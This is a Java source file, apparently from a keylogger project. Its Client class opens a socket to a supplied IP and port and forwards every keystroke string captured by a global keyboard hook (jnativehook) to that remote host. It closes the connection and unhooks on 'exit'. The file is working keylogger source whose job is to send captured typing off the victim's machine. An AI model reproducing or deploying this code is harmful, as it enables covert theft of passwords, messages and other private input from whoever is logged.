package keylogger.client.client;

import java.io.IOException;
import java.io.PrintStream;
import java.net.Socket;
import java.net.UnknownHostException;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import keylogger.client.monitoramento.Captura;
import keylogger.client.observerdesignpattern.Observer;
import keylogger.client.observerdesignpattern.Subject;

/**
 * "Feel the beat now,
 * If you've got nothing left say."
 * Good Charlotte.
 * 
 * @author Leonardo
 */
public class Client implements Observer {
	private Socket client;
	private PrintStream exit;
	private Subject captura;
	
	public Client(String ip, int port, Subject captura) throws UnknownHostException {
		try {
			this.client = new Socket(ip, port);
			this.exit = new PrintStream(this.client.getOutputStream());
			this.captura = new Captura();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	@Override
	public void update(String data) {
		try {
			this.exit.println(data);
			if(data.equalsIgnoreCase("exit")) {
				this.exit.println("Cliente Desconectado.");
				this.exit.close();
				this.client.close();
				
				try {
					GlobalScreen.unregisterNativeHook();
					GlobalScreen.removeNativeKeyListener((Captura) this.captura);
				} catch(NativeHookException e) {
					e.printStackTrace();
				}
			}	
		} catch(IOException e) {
			e.printStackTrace();
		}
	}
}
